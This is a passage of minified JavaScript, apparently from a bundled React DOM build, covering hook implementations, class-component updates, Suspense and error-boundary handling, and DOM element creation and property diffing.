t={tag:t,create:i,destroy:o,deps:u,next:null},i=Be.updateQueue,i===null?(i={lastEffect:null,stores:null},Be.updateQueue=i,i.lastEffect=t.next=t):(o=i.lastEffect,o===null?i.lastEffect=t.next=t:(u=o.next,o.next=t,t.next=u,i.lastEffect=t)),t}function tp(){return Ot().memoizedState}function vo(t,i,o,u){var h=Xt();Be.flags|=t,h.memoizedState=Xi(1|i,o,void 0,u===void 0?null:u)}function wo(t,i,o,u){var h=Ot();u=u===void 0?null:u;var g=void 0;if(Ge!==null){var b=Ge.memoizedState;if(g=b.destroy,u!==null&&zl(u,b.deps)){h.memoizedState=Xi(i,o,g,u);return}}Be.flags|=t,h.memoizedState=Xi(1|i,o,g,u)}function np(t,i){return vo(8390656,8,t,i)}function ql(t,i){return wo(2048,8,t,i)}function rp(t,i){return wo(4,2,t,i)}function ip(t,i){return wo(4,4,t,i)}function sp(t,i){if(typeof i=="function")return t=t(),i(t),function(){i(null)};if(i!=null)return t=t(),i.current=t,function(){i.current=null}}function op(t,i,o){return o=o!=null?o.concat([t]):null,wo(4,4,sp.bind(null,i,t),o)}function Gl(){}function ap(t,i){var o=Ot();i=i===void 0?null:i;var u=o.memoizedState;return u!==null&&i!==null&&zl(i,u[1])?u[0]:(o.memoizedState=[t,i],t)}function lp(t,i){var o=Ot();i=i===void 0?null:i;var u=o.memoizedState;return u!==null&&i!==null&&zl(i,u[1])?u[0]:(t=t(),o.memoizedState=[t,i],t)}function cp(t,i,o){return(nr&21)===0?(t.baseState&&(t.baseState=!1,gt=!0),t.memoizedState=o):(Ft(o,i)||(o=Fd(),Be.lanes|=o,rr|=o,t.baseState=!0),i)}function pw(t,i){var o=Te;Te=o!==0&&4>o?o:4,t(!0);var u=Ul.transition;Ul.transition={};try{t(!1),i()}finally{Te=o,Ul.transition=u}}function up(){return Ot().memoizedState}function fw(t,i,o){var u=On(t);if(o={lane:u,action:o,hasEagerState:!1,eagerState:null,next:null},dp(t))hp(i,o);else if(o=Vh(t,i,o,u),o!==null){var h=dt();$t(o,t,u,h),pp(o,i,u)}}function gw(t,i,o){var u=On(t),h={lane:u,action:o,hasEagerState:!1,eagerState:null,next:null};if(dp(t))hp(i,h);else{var g=t.alternate;if(t.lanes===0&&(g===null||g.lanes===0)&&(g=i.lastRenderedReducer,g!==null))try{var b=i.lastRenderedState,S=g(b,o);if(h.hasEagerState=!0,h.eagerState=S,Ft(S,b)){var E=i.interleaved;E===null?(h.next=h,jl(i)):(h.next=E.next,E.next=h),i.interleaved=h;return}}catch{}finally{}o=Vh(t,i,h,u),o!==null&&(h=dt(),$t(o,t,u,h),pp(o,i,u))}}function dp(t){var i=t.alternate;return t===Be||i!==null&&i===Be}function hp(t,i){Ji=bo=!0;var o=t.pending;o===null?i.next=i:(i.next=o.next,o.next=i),t.pending=i}function pp(t,i,o){if((o&4194240)!==0){var u=i.lanes;u&=t.pendingLanes,o|=u,i.lanes=o,Ja(t,o)}}var ko={readContext:Dt,useCallback:ot,useContext:ot,useEffect:ot,useImperativeHandle:ot,useInsertionEffect:ot,useLayoutEffect:ot,useMemo:ot,useReducer:ot,useRef:ot,useState:ot,useDebugValue:ot,useDeferredValue:ot,useTransition:ot,useMutableSource:ot,useSyncExternalStore:ot,useId:ot,unstable_isNewReconciler:!1},mw={readContext:Dt,useCallback:function(t,i){return Xt().memoizedState=[t,i===void 0?null:i],t},useContext:Dt,useEffect:np,useImperativeHandle:function(t,i,o){return o=o!=null?o.concat([t]):null,vo(4194308,4,sp.bind(null,i,t),o)},useLayoutEffect:function(t,i){return vo(4194308,4,t,i)},useInsertionEffect:function(t,i){return vo(4,2,t,i)},useMemo:function(t,i){var o=Xt();return i=i===void 0?null:i,t=t(),o.memoizedState=[t,i],t},useReducer:function(t,i,o){var u=Xt();return i=o!==void 0?o(i):i,u.memoizedState=u.baseState=i,t={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:t,lastRenderedState:i},u.queue=t,t=t.dispatch=fw.bind(null,Be,t),[u.memoizedState,t]},useRef:function(t){var i=Xt();return t={current:t},i.memoizedState=t},useState:ep,useDebugValue:Gl,useDeferredValue:function(t){return Xt().memoizedState=t},useTransition:function(){var t=ep(!1),i=t[0];return t=pw.bind(null,t[1]),Xt().memoizedState=t,[i,t]},useMutableSource:function(){},useSyncExternalStore:function(t,i,o){var u=Be,h=Xt();if(je){if(o===void 0)throw Error(r(407));o=o()}else{if(o=i(),Ze===null)throw Error(r(349));(nr&30)!==0||Jh(u,i,o)}h.memoizedState=o;var g={value:o,getSnapshot:i};return h.queue=g,np(Yh.bind(null,u,g,t),[t]),u.flags|=2048,Xi(9,Qh.bind(null,u,g,o,i),void 0,null),o},useId:function(){var t=Xt(),i=Ze.identifierPrefix;if(je){var o=an,u=on;o=(u&~(1<<32-Lt(u)-1)).toString(32)+o,i=":"+i+"R"+o,o=Qi++,0<o&&(i+="H"+o.toString(32)),i+=":"}else o=hw++,i=":"+i+"r"+o.toString(32)+":";return t.memoizedState=i},unstable_isNewReconciler:!1},yw={readContext:Dt,useCallback:ap,useContext:Dt,useEffect:ql,useImperativeHandle:op,useInsertionEffect:rp,useLayoutEffect:ip,useMemo:lp,useReducer:$l,useRef:tp,useState:function(){return $l(Yi)},useDebugValue:Gl,useDeferredValue:function(t){var i=Ot();return cp(i,Ge.memoizedState,t)},useTransition:function(){var t=$l(Yi)[0],i=Ot().memoizedState;return[t,i]},useMutableSource:Gh,useSyncExternalStore:Kh,useId:up,unstable_isNewReconciler:!1},bw={readContext:Dt,useCallback:ap,useContext:Dt,useEffect:ql,useImperativeHandle:op,useInsertionEffect:rp,useLayoutEffect:ip,useMemo:lp,useReducer:Hl,useRef:tp,useState:function(){return Hl(Yi)},useDebugValue:Gl,useDeferredValue:function(t){var i=Ot();return Ge===null?i.memoizedState=t:cp(i,Ge.memoizedState,t)},useTransition:function(){var t=Hl(Yi)[0],i=Ot().memoizedState;return[t,i]},useMutableSource:Gh,useSyncExternalStore:Kh,useId:up,unstable_isNewReconciler:!1};function zt(t,i){if(t&&t.defaultProps){i=J({},i),t=t.defaultProps;for(var o in t)i[o]===void 0&&(i[o]=t[o]);return i}return i}function Kl(t,i,o,u){i=t.memoizedState,o=o(u,i),o=o==null?i:J({},i,o),t.memoizedState=o,t.lanes===0&&(t.updateQueue.baseState=o)}var xo={isMounted:function(t){return(t=t._reactInternals)?Jn(t)===t:!1},enqueueSetState:function(t,i,o){t=t._reactInternals;var u=dt(),h=On(t),g=cn(u,h);g.payload=i,o!=null&&(g.callback=o),i=_n(t,g,h),i!==null&&($t(i,t,h,u),fo(i,t,h))},enqueueReplaceState:function(t,i,o){t=t._reactInternals;var u=dt(),h=On(t),g=cn(u,h);g.tag=1,g.payload=i,o!=null&&(g.callback=o),i=_n(t,g,h),i!==null&&($t(i,t,h,u),fo(i,t,h))},enqueueForceUpdate:function(t,i){t=t._reactInternals;var o=dt(),u=On(t),h=cn(o,u);h.tag=2,i!=null&&(h.callback=i),i=_n(t,h,u),i!==null&&($t(i,t,u,o),fo(i,t,u))}};function fp(t,i,o,u,h,g,b){return t=t.stateNode,typeof t.shouldComponentUpdate=="function"?t.shouldComponentUpdate(u,g,b):i.prototype&&i.prototype.isPureReactComponent?!Li(o,u)||!Li(h,g):!0}function gp(t,i,o){var u=!1,h=Cn,g=i.contextType;return typeof g=="object"&&g!==null?g=Dt(g):(h=ft(i)?Yn:st.current,u=i.contextTypes,g=(u=u!=null)?Fr(t,h):Cn),i=new i(o,g),t.memoizedState=i.state!==null&&i.state!==void 0?i.state:null,i.updater=xo,t.stateNode=i,i._reactInternals=t,u&&(t=t.stateNode,t.__reactInternalMemoizedUnmaskedChildContext=h,t.__reactInternalMemoizedMaskedChildContext=g),i}function mp(t,i,o,u){t=i.state,typeof i.componentWillReceiveProps=="function"&&i.componentWillReceiveProps(o,u),typeof i.UNSAFE_componentWillReceiveProps=="function"&&i.UNSAFE_componentWillReceiveProps(o,u),i.state!==t&&xo.enqueueReplaceState(i,i.state,null)}function Jl(t,i,o,u){var h=t.stateNode;h.props=o,h.state=t.memoizedState,h.refs={},Ml(t);var g=i.contextType;typeof g=="object"&&g!==null?h.context=Dt(g):(g=ft(i)?Yn:st.current,h.context=Fr(t,g)),h.state=t.memoizedState,g=i.getDerivedStateFromProps,typeof g=="function"&&(Kl(t,i,g,o),h.state=t.memoizedState),typeof i.getDerivedStateFromProps=="function"||typeof h.getSnapshotBeforeUpdate=="function"||typeof h.UNSAFE_componentWillMount!="function"&&typeof h.componentWillMount!="function"||(i=h.state,typeof h.componentWillMount=="function"&&h.componentWillMount(),typeof h.UNSAFE_componentWillMount=="function"&&h.UNSAFE_componentWillMount(),i!==h.state&&xo.enqueueReplaceState(h,h.state,null),go(t,o,h,u),h.state=t.memoizedState),typeof h.componentDidMount=="function"&&(t.flags|=4194308)}function Gr(t,i){try{var o="",u=i;do o+=ve(u),u=u.return;while(u);var h=o}catch(g){h=`
Error generating stack: `+g.message+`
`+g.stack}return{value:t,source:i,stack:h,digest:null}}function Ql(t,i,o){return{value:t,source:null,stack:o??null,digest:i??null}}function Yl(t,i){try{console.error(i.value)}catch(o){setTimeout(function(){throw o})}}var vw=typeof WeakMap=="function"?WeakMap:Map;function yp(t,i,o){o=cn(-1,o),o.tag=3,o.payload={element:null};var u=i.value;return o.callback=function(){_o||(_o=!0,hc=u),Yl(t,i)},o}function bp(t,i,o){o=cn(-1,o),o.tag=3;var u=t.type.getDerivedStateFromError;if(typeof u=="function"){var h=i.value;o.payload=function(){return u(h)},o.callback=function(){Yl(t,i)}}var g=t.stateNode;return g!==null&&typeof g.componentDidCatch=="function"&&(o.callback=function(){Yl(t,i),typeof u!="function"&&(Rn===null?Rn=new Set([this]):Rn.add(this));var b=i.stack;this.componentDidCatch(i.value,{componentStack:b!==null?b:""})}),o}function vp(t,i,o){var u=t.pingCache;if(u===null){u=t.pingCache=new vw;var h=new Set;u.set(i,h)}else h=u.get(i),h===void 0&&(h=new Set,u.set(i,h));h.has(o)||(h.add(o),t=Ow.bind(null,t,i,o),i.then(t,t))}function wp(t){do{var i;if((i=t.tag===13)&&(i=t.memoizedState,i=i!==null?i.dehydrated!==null:!0),i)return t;t=t.return}while(t!==null);return null}function kp(t,i,o,u,h){return(t.mode&1)===0?(t===i?t.flags|=65536:(t.flags|=128,o.flags|=131072,o.flags&=-52805,o.tag===1&&(o.alternate===null?o.tag=17:(i=cn(-1,1),i.tag=2,_n(o,i,1))),o.lanes|=1),t):(t.flags|=65536,t.lanes=h,t)}var ww=M.ReactCurrentOwner,gt=!1;function ut(t,i,o,u){i.child=t===null?zh(i,null,o,u):Wr(i,t.child,o,u)}function xp(t,i,o,u,h){o=o.render;var g=i.ref;return Hr(i,h),u=Vl(t,i,o,u,g,h),o=Wl(),t!==null&&!gt?(i.updateQueue=t.updateQueue,i.flags&=-2053,t.lanes&=~h,un(t,i,h)):(je&&o&&Al(i),i.flags|=1,ut(t,i,u,h),i.child)}function Sp(t,i,o,u,h){if(t===null){var g=o.type;return typeof g=="function"&&!vc(g)&&g.defaultProps===void 0&&o.compare===null&&o.defaultProps===void 0?(i.tag=15,i.type=g,Tp(t,i,g,u,h)):(t=Mo(o.type,null,u,i,i.mode,h),t.ref=i.ref,t.return=i,i.child=t)}if(g=t.child,(t.lanes&h)===0){var b=g.memoizedProps;if(o=o.compare,o=o!==null?o:Li,o(b,u)&&t.ref===i.ref)return un(t,i,h)}return i.flags|=1,t=Mn(g,u),t.ref=i.ref,t.return=i,i.child=t}function Tp(t,i,o,u,h){if(t!==null){var g=t.memoizedProps;if(Li(g,u)&&t.ref===i.ref)if(gt=!1,i.pendingProps=u=g,(t.lanes&h)!==0)(t.flags&131072)!==0&&(gt=!0);else return i.lanes=t.lanes,un(t,i,h)}return Xl(t,i,o,u,h)}function Ap(t,i,o){var u=i.pendingProps,h=u.children,g=t!==null?t.memoizedState:null;if(u.mode==="hidden")if((i.mode&1)===0)i.memoizedState={baseLanes:0,cachePool:null,transitions:null},Pe(Jr,At),At|=o;else{if((o&1073741824)===0)return t=g!==null?g.baseLanes|o:o,i.lanes=i.childLanes=1073741824,i.memoizedState={baseLanes:t,cachePool:null,transitions:null},i.updateQueue=null,Pe(Jr,At),At|=t,null;i.memoizedState={baseLanes:0,cachePool:null,transitions:null},u=g!==null?g.baseLanes:o,Pe(Jr,At),At|=u}else g!==null?(u=g.baseLanes|o,i.memoizedState=null):u=o,Pe(Jr,At),At|=u;return ut(t,i,h,o),i.child}function Cp(t,i){var o=i.ref;(t===null&&o!==null||t!==null&&t.ref!==o)&&(i.flags|=512,i.flags|=2097152)}function Xl(t,i,o,u,h){var g=ft(o)?Yn:st.current;return g=Fr(i,g),Hr(i,h),o=Vl(t,i,o,u,g,h),u=Wl(),t!==null&&!gt?(i.updateQueue=t.updateQueue,i.flags&=-2053,t.lanes&=~h,un(t,i,h)):(je&&u&&Al(i),i.flags|=1,ut(t,i,o,h),i.child)}function Ep(t,i,o,u,h){if(ft(o)){var g=!0;so(i)}else g=!1;if(Hr(i,h),i.stateNode===null)To(t,i),gp(i,o,u),Jl(i,o,u,h),u=!0;else if(t===null){var b=i.stateNode,S=i.memoizedProps;b.props=S;var E=b.context,j=o.contextType;typeof j=="object"&&j!==null?j=Dt(j):(j=ft(o)?Yn:st.current,j=Fr(i,j));var F=o.getDerivedStateFromProps,z=typeof F=="function"||typeof b.getSnapshotBeforeUpdate=="function";z||typeof b.UNSAFE_componentWillReceiveProps!="function"&&typeof b.componentWillReceiveProps!="function"||(S!==u||E!==j)&&mp(i,b,u,j),Pn=!1;var L=i.memoizedState;b.state=L,go(i,u,b,h),E=i.memoizedState,S!==u||L!==E||pt.current||Pn?(typeof F=="function"&&(Kl(i,o,F,u),E=i.memoizedState),(S=Pn||fp(i,o,S,u,L,E,j))?(z||typeof b.UNSAFE_componentWillMount!="function"&&typeof b.componentWillMount!="function"||(typeof b.componentWillMount=="function"&&b.componentWillMount(),typeof b.UNSAFE_componentWillMount=="function"&&b.UNSAFE_componentWillMount()),typeof b.componentDidMount=="function"&&(i.flags|=4194308)):(typeof b.componentDidMount=="function"&&(i.flags|=4194308),i.memoizedProps=u,i.memoizedState=E),b.props=u,b.state=E,b.context=j,u=S):(typeof b.componentDidMount=="function"&&(i.flags|=4194308),u=!1)}else{b=i.stateNode,Wh(t,i),S=i.memoizedProps,j=i.type===i.elementType?S:zt(i.type,S),b.props=j,z=i.pendingProps,L=b.context,E=o.contextType,typeof E=="object"&&E!==null?E=Dt(E):(E=ft(o)?Yn:st.current,E=Fr(i,E));var Q=o.getDerivedStateFromProps;(F=typeof Q=="function"||typeof b.getSnapshotBeforeUpdate=="function")||typeof b.UNSAFE_componentWillReceiveProps!="function"&&typeof b.componentWillReceiveProps!="function"||(S!==z||L!==E)&&mp(i,b,u,E),Pn=!1,L=i.memoizedState,b.state=L,go(i,u,b,h);var Z=i.memoizedState;S!==z||L!==Z||pt.current||Pn?(typeof Q=="function"&&(Kl(i,o,Q,u),Z=i.memoizedState),(j=Pn||fp(i,o,j,u,L,Z,E)||!1)?(F||typeof b.UNSAFE_componentWillUpdate!="function"&&typeof b.componentWillUpdate!="function"||(typeof b.componentWillUpdate=="function"&&b.componentWillUpdate(u,Z,E),typeof b.UNSAFE_componentWillUpdate=="function"&&b.UNSAFE_componentWillUpdate(u,Z,E)),typeof b.componentDidUpdate=="function"&&(i.flags|=4),typeof b.getSnapshotBeforeUpdate=="function"&&(i.flags|=1024)):(typeof b.componentDidUpdate!="function"||S===t.memoizedProps&&L===t.memoizedState||(i.flags|=4),typeof b.getSnapshotBeforeUpdate!="function"||S===t.memoizedProps&&L===t.memoizedState||(i.flags|=1024),i.memoizedProps=u,i.memoizedState=Z),b.props=u,b.state=Z,b.context=E,u=j):(typeof b.componentDidUpdate!="function"||S===t.memoizedProps&&L===t.memoizedState||(i.flags|=4),typeof b.getSnapshotBeforeUpdate!="function"||S===t.memoizedProps&&L===t.memoizedState||(i.flags|=1024),u=!1)}return Zl(t,i,o,u,g,h)}function Zl(t,i,o,u,h,g){Cp(t,i);var b=(i.flags&128)!==0;if(!u&&!b)return h&&Dh(i,o,!1),un(t,i,g);u=i.stateNode,ww.current=i;var S=b&&typeof o.getDerivedStateFromError!="function"?null:u.render();return i.flags|=1,t!==null&&b?(i.child=Wr(i,t.child,null,g),i.child=Wr(i,null,S,g)):ut(t,i,S,g),i.memoizedState=u.state,h&&Dh(i,o,!0),i.child}function Pp(t){var i=t.stateNode;i.pendingContext?Ih(t,i.pendingContext,i.pendingContext!==i.context):i.context&&Ih(t,i.context,!1),Bl(t,i.containerInfo)}function _p(t,i,o,u,h){return Vr(),_l(h),i.flags|=256,ut(t,i,o,u),i.child}var ec={dehydrated:null,treeContext:null,retryLane:0};function tc(t){return{baseLanes:t,cachePool:null,transitions:null}}function Ip(t,i,o){var u=i.pendingProps,h=Me.current,g=!1,b=(i.flags&128)!==0,S;if((S=b)||(S=t!==null&&t.memoizedState===null?!1:(h&2)!==0),S?(g=!0,i.flags&=-129):(t===null||t.memoizedState!==null)&&(h|=1),Pe(Me,h&1),t===null)return Pl(i),t=i.memoizedState,t!==null&&(t=t.dehydrated,t!==null)?((i.mode&1)===0?i.lanes=1:t.data==="$!"?i.lanes=8:i.lanes=1073741824,null):(b=u.children,t=u.fallback,g?(u=i.mode,g=i.child,b={mode:"hidden",children:b},(u&1)===0&&g!==null?(g.childLanes=0,g.pendingProps=b):g=Bo(b,u,0,null),t=ar(t,u,o,null),g.return=i,t.return=i,g.sibling=t,i.child=g,i.child.memoizedState=tc(o),i.memoizedState=ec,t):nc(i,b));if(h=t.memoizedState,h!==null&&(S=h.dehydrated,S!==null))return kw(t,i,b,u,S,h,o);if(g){g=u.fallback,b=i.mode,h=t.child,S=h.sibling;var E={mode:"hidden",children:u.children};return(b&1)===0&&i.child!==h?(u=i.child,u.childLanes=0,u.pendingProps=E,i.deletions=null):(u=Mn(h,E),u.subtreeFlags=h.subtreeFlags&14680064),S!==null?g=Mn(S,g):(g=ar(g,b,o,null),g.flags|=2),g.return=i,u.return=i,u.sibling=g,i.child=u,u=g,g=i.child,b=t.child.memoizedState,b=b===null?tc(o):{baseLanes:b.baseLanes|o,cachePool:null,transitions:b.transitions},g.memoizedState=b,g.childLanes=t.childLanes&~o,i.memoizedState=ec,u}return g=t.child,t=g.sibling,u=Mn(g,{mode:"visible",children:u.children}),(i.mode&1)===0&&(u.lanes=o),u.return=i,u.sibling=null,t!==null&&(o=i.deletions,o===null?(i.deletions=[t],i.flags|=16):o.push(t)),i.child=u,i.memoizedState=null,u}function nc(t,i){return i=Bo({mode:"visible",children:i},t.mode,0,null),i.return=t,t.child=i}function So(t,i,o,u){return u!==null&&_l(u),Wr(i,t.child,null,o),t=nc(i,i.pendingProps.children),t.flags|=2,i.memoizedState=null,t}function kw(t,i,o,u,h,g,b){if(o)return i.flags&256?(i.flags&=-257,u=Ql(Error(r(422))),So(t,i,b,u)):i.memoizedState!==null?(i.child=t.child,i.flags|=128,null):(g=u.fallback,h=i.mode,u=Bo({mode:"visible",children:u.children},h,0,null),g=ar(g,h,b,null),g.flags|=2,u.return=i,g.return=i,u.sibling=g,i.child=u,(i.mode&1)!==0&&Wr(i,t.child,null,b),i.child.memoizedState=tc(b),i.memoizedState=ec,g);if((i.mode&1)===0)return So(t,i,b,null);if(h.data==="$!"){if(u=h.nextSibling&&h.nextSibling.dataset,u)var S=u.dgst;return u=S,g=Error(r(419)),u=Ql(g,u,void 0),So(t,i,b,u)}if(S=(b&t.childLanes)!==0,gt||S){if(u=Ze,u!==null){switch(b&-b){case 4:h=2;break;case 16:h=8;break;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:h=32;break;case 536870912:h=268435456;break;default:h=0}h=(h&(u.suspendedLanes|b))!==0?0:h,h!==0&&h!==g.retryLane&&(g.retryLane=h,ln(t,h),$t(u,t,h,-1))}return bc(),u=Ql(Error(r(421))),So(t,i,b,u)}return h.data==="$?"?(i.flags|=128,i.child=t.child,i=jw.bind(null,t),h._reactRetry=i,null):(t=g.treeContext,Tt=Tn(h.nextSibling),St=i,je=!0,Ut=null,t!==null&&(It[Rt++]=on,It[Rt++]=an,It[Rt++]=Xn,on=t.id,an=t.overflow,Xn=i),i=nc(i,u.children),i.flags|=4096,i)}function Rp(t,i,o){t.lanes|=i;var u=t.alternate;u!==null&&(u.lanes|=i),Ol(t.return,i,o)}function rc(t,i,o,u,h){var g=t.memoizedState;g===null?t.memoizedState={isBackwards:i,rendering:null,renderingStartTime:0,last:u,tail:o,tailMode:h}:(g.isBackwards=i,g.rendering=null,g.renderingStartTime=0,g.last=u,g.tail=o,g.tailMode=h)}function Dp(t,i,o){var u=i.pendingProps,h=u.revealOrder,g=u.tail;if(ut(t,i,u.children,o),u=Me.current,(u&2)!==0)u=u&1|2,i.flags|=128;else{if(t!==null&&(t.flags&128)!==0)e:for(t=i.child;t!==null;){if(t.tag===13)t.memoizedState!==null&&Rp(t,o,i);else if(t.tag===19)Rp(t,o,i);else if(t.child!==null){t.child.return=t,t=t.child;continue}if(t===i)break e;for(;t.sibling===null;){if(t.return===null||t.return===i)break e;t=t.return}t.sibling.return=t.return,t=t.sibling}u&=1}if(Pe(Me,u),(i.mode&1)===0)i.memoizedState=null;else switch(h){case"forwards":for(o=i.child,h=null;o!==null;)t=o.alternate,t!==null&&mo(t)===null&&(h=o),o=o.sibling;o=h,o===null?(h=i.child,i.child=null):(h=o.sibling,o.sibling=null),rc(i,!1,h,o,g);break;case"backwards":for(o=null,h=i.child,i.child=null;h!==null;){if(t=h.alternate,t!==null&&mo(t)===null){i.child=h;break}t=h.sibling,h.sibling=o,o=h,h=t}rc(i,!0,o,null,g);break;case"together":rc(i,!1,null,null,void 0);break;default:i.memoizedState=null}return i.child}function To(t,i){(i.mode&1)===0&&t!==null&&(t.alternate=null,i.alternate=null,i.flags|=2)}function un(t,i,o){if(t!==null&&(i.dependencies=t.dependencies),rr|=i.lanes,(o&i.childLanes)===0)return null;if(t!==null&&i.child!==t.child)throw Error(r(153));if(i.child!==null){for(t=i.child,o=Mn(t,t.pendingProps),i.child=o,o.return=i;t.sibling!==null;)t=t.sibling,o=o.sibling=Mn(t,t.pendingProps),o.return=i;o.sibling=null}return i.child}function xw(t,i,o){switch(i.tag){case 3:Pp(i),Vr();break;case 5:qh(i);break;case 1:ft(i.type)&&so(i);break;case 4:Bl(i,i.stateNode.containerInfo);break;case 10:var u=i.type._context,h=i.memoizedProps.value;Pe(ho,u._currentValue),u._currentValue=h;break;case 13:if(u=i.memoizedState,u!==null)return u.dehydrated!==null?(Pe(Me,Me.current&1),i.flags|=128,null):(o&i.child.childLanes)!==0?Ip(t,i,o):(Pe(Me,Me.current&1),t=un(t,i,o),t!==null?t.sibling:null);Pe(Me,Me.current&1);break;case 19:if(u=(o&i.childLanes)!==0,(t.flags&128)!==0){if(u)return Dp(t,i,o);i.flags|=128}if(h=i.memoizedState,h!==null&&(h.rendering=null,h.tail=null,h.lastEffect=null),Pe(Me,Me.current),u)break;return null;case 22:case 23:return i.lanes=0,Ap(t,i,o)}return un(t,i,o)}var Op,ic,jp,Mp;Op=function(t,i){for(var o=i.child;o!==null;){if(o.tag===5||o.tag===6)t.appendChild(o.stateNode);else if(o.tag!==4&&o.child!==null){o.child.return=o,o=o.child;continue}if(o===i)break;for(;o.sibling===null;){if(o.return===null||o.return===i)return;o=o.return}o.sibling.return=o.return,o=o.sibling}},ic=function(){},jp=function(t,i,o,u){var h=t.memoizedProps;if(h!==u){t=i.stateNode,tr(Yt.current);var g=null;switch(o){case"input":h=Oa(t,h),u=Oa(t,u),g=[];break;case"select":h=J({},h,{value:void 0}),u=J({},u,{value:void 0}),g=[];break;case"textarea":h=Ba(t,h),u=Ba(t,u),g=[];break;default:typeof h.onClick!="function"&&typeof u.onClick=="function"&&(t.onclick=no)}La(o,u);var b;o=null;for(j in h)if(!u.hasOwnProperty(j)&&h.hasOwnProperty(j)&&h[j]!=null)if(j==="style"){var S=h[j];for(b in S)S.hasOwnProperty(b)&&(o||(o={}),o[b]="")}else j!=="dangerouslySetInnerHTML"&&j!=="children"&&j!=="suppressContentEditableWarning"&&j!=="suppressHydrationWarning"&&j!=="autoFocus"&&(a.hasOwnProperty(j)?g||(g=[]):(g=g||[]).push(j,null));for(j in u){var E=u[j];if(S=h?.[j],u.hasOwnProperty(j)&&E!==S&&(E!=null||S!=null))if(j==="style")if(S){for(b in S)!S.hasOwnProperty(b)||E&&E.hasOwnProperty(b)||(o||(o={}),o[b]="");for(b in E)E.hasOwnProperty(b)&&S[b]!==E[b]&&(o||(o={}),o[b]=E[b])}else o||(g||(g=[]),g.push(j,o)),o=E;else j==="dangerouslySetInnerHTML"?(E=E?E.__html:void 0,S=S?S.__html:void 0,E!=null&&S!==E&&(g=g||[]).push(j,E)):j==="children"?typeof E!="string"&&typeof E!="number"||(g=g||[]).push(j,""+E):j!=="suppressContentEditableWarning"&&j!=="suppressHydrationWarning"&&(a.hasOwnProperty(j)?(E!=null&&j==="onScroll"&&Re("scroll",t),g||S===E||(g=[])):(g=g||[]).push(j,E))}o&&(g=g||[]).push("style",o);var j=g;(i.updateQueue=j)&&(i.flags|=4)}},Mp=function(t,i,o,u){o!==u&&(i.flags|=4)};function Zi(t,i){if(!je)switch(t.tailMode){case"hidden":i=t.tail;for(var o=null;i!==null;)i.alternate!==null&&(o=i),i=i.sibling;o===null?t.tail=null:o.sibling=null;break;case"collapsed":o=t.tail;for(var u=null;o!==null;)o.alternate!==null&&(u=o),o=o.sibling;u===null?i||t.tail===null?t.tail=null:t.tail.sibling=null:u.sibling=null}}function at(t){var i=t.alternate!==null&&t.alternate.child===t.child,o=0,u=0;if(i)for(var h=t.child;h!==null;)o|=h.lanes|h.childLanes,u|=h.subtreeFlags&14680064,u|=h.flags&14680064,h.return=t,h=h.sibling;else for(h=t.child;h!==null;)o|=h.lanes|h.childLanes,u|=h.subtreeFlags,u|=h.flags,h.return=t,h=h.sibling;return t.subtreeFlags|=u,t.childLanes=o,i}function Sw(t,i,o){var u=i.pendingProps;switch(Cl(i),i.tag){case 2:case 16:case 15:case 0:case 11:case 7:case 8:case 12:case 9:case 14:return at(i),null;case 1:return ft(i.type)&&io(),at(i),null;case 3:return u=i.stateNode,qr(),De(pt),De(st),Fl(),u.pendingContext&&(u.context=u.pendingContext,u.pendingContext=null),(t===null||t.child===null)&&(co(i)?i.flags|=4:t===null||t.memoizedState.isDehydrated&&(i.flags&256)===0||(i.flags|=1024,Ut!==null&&(gc(Ut),Ut=null))),ic(t,i),at(i),null;case 5:Nl(i);var h=tr(Ki.current);if(o=i.type,t!==null&&i.stateNode!=null)jp(t,i,o,u,h),t.ref!==i.ref&&(i.flags|=512,i.flags|=2097152);else{if(!u){if(i.stateNode===null)throw Error(r(166));return at(i),null}if(t=tr(Yt.current),co(i)){u=i.stateNode,o=i.type;var g=i.memoizedProps;switch(u[Qt]=i,u[Wi]=g,t=(i.mode&1)!==0,o){case"dialog":Re("cancel",u),Re("close",u);break;case"iframe":case"object":case"embed":Re("load",u);break;case"video":case"audio":for(h=0;h<Ui.length;h++)Re(Ui[h],u);break;case"source":Re("error",u);break;case"img":case"image":case"link":Re("error",u),Re("load",u);break;case"details":Re("toggle",u);break;case"input":gd(u,g),Re("invalid",u);break;case"select":u._wrapperState={wasMultiple:!!g.multiple},Re("invalid",u);break;case"textarea":bd(u,g),Re("invalid",u)}La(o,g),h=null;for(var b in g)if(g.hasOwnProperty(b)){var S=g[b];b==="children"?typeof S=="string"?u.textContent!==S&&(g.suppressHydrationWarning!==!0&&to(u.textContent,S,t),h=["children",S]):typeof S=="number"&&u.textContent!==""+S&&(g.suppressHydrationWarning!==!0&&to(u.textContent,S,t),h=["children",""+S]):a.hasOwnProperty(b)&&S!=null&&b==="onScroll"&&Re("scroll",u)}switch(o){case"input":_t(u),yd(u,g,!0);break;case"textarea":_t(u),wd(u);break;case"select":case"option":break;default:typeof g.onClick=="function"&&(u.onclick=no)}u=h,i.updateQueue=u,u!==null&&(i.flags|=4)}else{b=h.nodeType===9?h:h.ownerDocument,t==="http://www.w3.org/1999/xhtml"&&(t=kd(o)),t==="http://www.w3.org/1999/xhtml"?o==="script"?(t=b.createElement("div"),t.innerHTML="<script><\/script>",t=t.removeChild(t.firstChild)):typeof u.is=="string"?t=b.createElement(o,{is:u.is}):(t=b.createElement(o),o==="select"&&(b=t,u.multiple?b.multiple=!0:u.size&&(b.size=u.size))):t=b.createElementNS(t,o),t[Qt]=i,t[Wi]=u,Op(t,i,!1,!1),i.stateNode=t;e:{switch(b=Fa(o,u),o){case"dialog":Re("cancel",t),Re("close",t),h=u;break;case"iframe":case"object":case"embed":Re("load",t),h=u;break;case"video":case"audio":for(h=0;h<Ui.length;h++)Re(Ui[h],t);h=u;break;case"source":Re("error",t),h=u;break;case"img":case"image":case"link":Re("error",t),Re("load",t),h=u;break;case"details":Re("toggle",t),h=u;break;case"input":gd(t,u),h=Oa(t,u),Re("invalid",t);break;case"option":h=u;break;case"select":t._wrapperState={wasMultiple:!!u.multiple},h=J({},u,{value:void 0}),Re("invalid",t);break;case"textarea":bd(t,u),h=Ba(t,u),Re("invalid",t);break;default:h=u}La(o,h),S=h;for(g in S)if(S.hasOwnProperty(g)){var E=S[g];g==="style"?Td(t,E):g==="dangerouslySetInnerHTML"?(E=E?E.__html:void 0,E!=null&&xd(t,E)):g==="children"?typeof 